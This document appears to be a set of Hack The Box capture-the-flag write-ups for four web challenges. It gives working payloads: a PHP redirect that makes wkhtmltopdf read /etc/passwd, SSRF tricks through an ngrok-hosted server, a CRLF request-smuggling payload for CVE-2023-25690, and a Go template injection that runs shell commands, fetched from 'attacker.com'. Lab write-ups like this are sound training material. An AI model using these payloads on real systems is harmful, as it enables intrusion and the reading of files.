# HTB-PDFy-Challenge
- Takes the screenshot of the page and saves it as pdf using the `wkhtmltopdf` utility which we found from the error when we supplied something like `https://google.com;` i.e. the semicolon.
So, we used `ngrok` for local server interaction and hosting a `php` server.
Make a payload file `scr.php` and put,
```
<?php
header('location:file:///etc/passwd');
?>
```
And host it with,
`php -S 0.0.0.0:8000`
- Now tunnel it publically with,
`./ngrok tcp 8000`
So, now visit the public URL we get as,
`http://URL/scr.php`
which will redirect it to read the system files i.e. `/etc/passwd` here and will take a SS and will make a pdf of it.
Link: https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570

# HTB-ProxyAsAService-Challenge
- In the source code found a misconfigured string,
```
http://{SITE_NAME}{url}
```
So, here the `SITE_NAME` variable value is `reddit.com` while the `url` value is directly getting appended which is directly controlled by us and `/` is missing which allows the popular `@` escape technique, i.e.
```
http://reddit.com@hacker.com => http://hacker.com
```
i.e. anything before `@` character, here `reddit.com` gets omitted.
- So, now we hosted a PHP server with code, `php -s 0.0.0.0:8000`
```
<?php
header('location:http://0.0.0.0:1337/debug/environment');
?>
```
Because this `debug/environment` path is only accessible through `127.0.0.1` as per the source code.
- And finally started `ngrok` for tunneling as,
`./ngrok tcp 8000`
- Now finally to access this we visited it with,
`http://94.237.62.149:59025/?url=@0.tcp.in.ngrok.io:14478/scr.php`
which redirects it to visit the internal restricted path and eventually throws us the results on the response.

# HTB-ApacheBlaze-Challenge
- Apache reverse proxy. So, if a request is received from the host `dev.apacheblaze.local`, the flag is thrown. 
- Found `mod_proxy` module being used in the apache2 configuration file.
- So, located a public exploit, `CVE-2023–25690` for HTTP Request Smuggling attack.
Link: https://github.com/dhmosfunk/CVE-2023-25690-POC
- Used the payload, 
`/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/api/games/click_topia`

# HTB-RenderQuest-Challenge
- Went through the `main.go` source code and found SSRF i.e. it directly renders template from a supplied attacker url and executes it,
`/render?use_remote=true&page=http://attacker.com/file.txt`
- So, found a **Golang SSTI** article,
Link1: https://exploit-notes.hdks.org/exploit/web/go-ssti/
Link2: https://www.onsecurity.io/blog/go-ssti-method-research/
- So, going through the article, found that we can get RCE if a dangerous function is defined that directly executes system commands without sanitation and the source code did have one,
```
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}   
```
- So, now we hosted a file `index.tpl` using `python3 -m http.server 3000` and tunneling it publically with `./ngrok tcp 3000` with content,
```
{{ .FetchServerInfo "cat /flag*.txt" }}
```
- Finally visited,
`/render?use_remote=true&page=http://<ngrok.com>/index.tpl`
